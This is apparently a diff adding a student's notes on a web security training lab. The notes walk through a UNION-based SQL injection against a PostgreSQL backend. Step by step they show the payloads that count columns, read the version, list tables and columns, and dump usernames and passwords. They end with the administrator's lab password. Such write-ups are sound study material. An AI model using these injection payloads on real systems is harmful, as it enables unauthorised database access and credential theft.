@@ -1,0 +1,45 @@
+Lab #9 - SQL injection attack, listing the database contents on non-Oracle databases
+
+End Goals:
+- Determine the table that contains usernames and passwords
+- Determine the relevant columns
+- Output the content of the table
+- Login as the administrator user
+
+Analysis:
+
+1) Find the number of columns
+' order by 3-- -> Internal server error
+3 - 1 = 2
+
+
+2) Find the data type of the columns
+' UNION select 'a', 'a'--
+-> both columns accept type text
+
+
+3) Version of the database
+' UNION select @@version, null-- -> not microsoft
+' UNION select version(), null-- -> 200 OK
+PostgreSQL 12.12 (Ubuntu 12.12-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0, 64-bit
+
+
+4) Output the list of table names in the database
+' UNION SELECT table_name,null FROM information_schema.tables--
+users_jbvyxm
+
+
+5) Output the column names of the table
+' UNION SELECT column_name, NULL from information_schema.columns WHERE table_name = 'users_jbvyxm'--
+
+username_ldcful
+password_vacupv
+
+
+6) Output the usernames and passwords
+' UNION SELECT username_ldcful, password_vacupv FROM users_jbvyxm--
+
+administrator
+03dx8naoehw4iggpmh36
+
+script.py <url>
